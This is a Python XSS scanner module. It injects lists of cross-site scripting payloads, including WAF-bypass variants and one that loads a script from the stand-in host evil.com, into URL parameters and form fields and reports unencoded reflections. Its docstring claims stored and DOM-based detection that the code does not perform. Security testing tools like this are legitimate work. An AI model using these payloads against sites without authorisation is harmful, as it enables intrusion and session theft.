"""
XSS Scanner - Detects Reflected, Stored, and DOM-based Cross-Site Scripting.
"""

from typing import List, Dict, Optional
from bs4 import BeautifulSoup
import uuid
import logging

logger = logging.getLogger(__name__)


XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    '<img src=x onerror=alert(1)>',
    '<svg/onload=alert(1)>',
    '"><img src=x onerror=alert(1)>',
    "javascript:alert(1)",
    '"><details/open/ontoggle=alert(1)>',
    '<iframe src="javascript:alert(1)">',
    '"-confirm(1)-"',
    '\';alert(1);//',
    '</script><script>alert(1)</script>',
    '<body onload=alert(1)>',
    '<input autofocus onfocus=alert(1)>',
    '{{7*7}}',            # Template injection probe
    '${7*7}',             # Template injection probe
]

# Context-aware payloads for bypass attempts
WAF_BYPASS_PAYLOADS = [
    '<ScRiPt>alert(1)</ScRiPt>',
    '<script >alert(1)</script >',
    '<<script>alert(1)//<</script>',
    '<script/src=//evil.com/xss.js>',
    '<scr\x00ipt>alert(1)</scr\x00ipt>',
    '&lt;script&gt;alert(1)&lt;/script&gt;',
    '%3Cscript%3Ealert(1)%3C%2Fscript%3E',
    '<img src="1" onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>',
]


class XSSScanner:
    """Tests for Cross-Site Scripting vulnerabilities in URL params and forms."""

    def __init__(self, session, include_waf_bypass: bool = False):
        self.session = session
        self.payloads = XSS_PAYLOADS[:]
        if include_waf_bypass:
            self.payloads += WAF_BYPASS_PAYLOADS
        self.findings: List[Dict] = []

    def _is_reflected(self, payload: str, response_text: str) -> bool:
        """Check if payload is reflected unencoded in the response."""
        return payload in response_text

    def _check_response(self, resp, payload: str, url: str, param: str, method: str) -> Optional[Dict]:
        """Evaluate a response for XSS reflection."""
        if not resp:
            return None
        if self._is_reflected(payload, resp.text):
            return {
                "type": "XSS",
                "subtype": "Reflected",
                "severity": "High",
                "url": url,
                "parameter": param,
                "method": method.upper(),
                "payload": payload,
                "evidence": f"Payload reflected unencoded in response body",
            }
        return None

    def scan_url(self, url: str) -> List[Dict]:
        """Inject XSS payloads into URL query parameters."""
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        if not params:
            return []

        results = []
        for param in params:
            for payload in self.payloads:
                test_params = {k: v[0] for k, v in params.items()}
                test_params[param] = payload
                new_query = urlencode(test_params)
                test_url = urlunparse(parsed._replace(query=new_query))

                resp = self.session.get(test_url)
                finding = self._check_response(resp, payload, url, param, "GET")
                if finding:
                    results.append(finding)
                    logger.warning(f"[XSS] Found in param '{param}' at {url}")
                    break  # One confirmed finding per param is enough

        return results

    def scan_form(self, form: Dict) -> List[Dict]:
        """Inject XSS payloads into form inputs."""
        results = []
        action = form["action"]
        method = form["method"]

        for inp in form["inputs"]:
            param_name = inp["name"]
            for payload in self.payloads:
                data = {i["name"]: i["value"] or "test" for i in form["inputs"]}
                data[param_name] = payload

                if method == "post":
                    resp = self.session.post(action, data=data)
                else:
                    resp = self.session.get(action, params=data)

                finding = self._check_response(resp, payload, action, param_name, method)
                if finding:
                    results.append(finding)
                    logger.warning(f"[XSS] Found in form field '{param_name}' at {action}")
                    break

        return results

    def run(self, urls, forms) -> List[Dict]:
        """Run XSS scans across all discovered URLs and forms."""
        logger.info("[XSS] Starting scan...")
        for url in urls:
            self.findings.extend(self.scan_url(url))
        for form in forms:
            self.findings.extend(self.scan_form(form))
        logger.info(f"[XSS] Done. Findings: {len(self.findings)}")
        return self.findings
